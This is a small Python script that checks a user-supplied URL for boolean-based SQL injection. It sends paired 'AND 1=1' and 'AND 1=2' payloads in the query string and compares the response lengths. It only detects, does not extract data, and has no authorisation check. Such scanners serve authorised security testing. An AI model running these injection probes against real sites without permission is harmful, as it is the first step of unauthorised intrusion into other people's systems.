#!/usr/bin/env python3
import requests
import re

def is_url(url):
    url_pattern = r'^(http|https)://[\w/:%#\$&\?\(\)~\.=\+\-]+$'
    return re.match(url_pattern, url)

def is_vulnerable(target_url, target_param):
    print("[*] Checking SQLi vulnerability...")
    payload_true = f"{target_param} AND 1=1-- -"
    payload_false = f"{target_param} AND 1=2-- -"

    try:
        response_true = requests.get(target_url, params=payload_true, timeout=10)
        response_false = requests.get(target_url, params=payload_false, timeout=10)
        
        if len(response_false.text) != len(response_true.text):
            if response_true.status_code == 200:
                print("[!] Result: The page is VULNERABLE to SQLi.")
                return True
        print("[-] Result: SQLi vulnerability NOT detected.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection Error: {e}")
        return False

def main(user_input):
    parts = user_input.split('?', 1)
    if len(parts) == 2:
        target_url = parts[0]
        target_param = parts[1]
        print(f"[*] Target URL: {target_url}")
        print(f"[*] Target Parameter: {target_param}")
    else:
        print("[!] URL doesn't include '?', Check your input")
        return
    
    is_vulnerable(target_url, target_param)
    print("[*] Scan completed.")

if __name__ == "__main__":
    try:
        while True:
            url = input("[*] Input URL: ")
            if is_url(url):
                main(url)
                break 
            else:
                print("[!] Invalid URL. Make sure it has http(s) and parameters.")
    except KeyboardInterrupt:
        print("\n[!] User interrupted. Exiting...")